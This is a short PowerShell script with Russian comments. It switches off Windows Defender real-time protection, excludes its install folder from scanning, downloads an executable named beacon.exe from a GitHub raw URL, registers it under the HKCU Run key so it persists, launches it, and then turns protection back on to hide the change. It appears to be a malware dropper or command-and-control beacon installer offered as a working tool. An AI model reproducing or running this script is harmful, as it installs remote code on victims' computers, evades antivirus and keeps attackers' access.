$url  = "https://raw.githubusercontent.com/cyber13524/beacon/main/beacon.exe"
$path = "C:\Tools\beacon.exe"

# создаём папку если нет
$dir = Split-Path $path
if (!(Test-Path $dir)) {
    New-Item -ItemType Directory -Path $dir -Force | Out-Null
}

# скачиваем файл

Set-MpPreference -DisableRealtimeMonitoring $true
Start-Sleep -Seconds 3
Add-MpPreference -ExclusionPath "C:\Tools"
Start-Sleep -Seconds 3
Invoke-WebRequest -Uri $url -OutFile $path
New-ItemProperty `
  -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
  -Name "Beacon" `
  -Value "C:\Tools\beacon.exe" `
  -PropertyType String
  Start-Process "C:\Tools\beacon.exe" -ArgumentList "-test -debug"
  Start-Sleep -Seconds 3
  Set-MpPreference -DisableRealtimeMonitoring $false
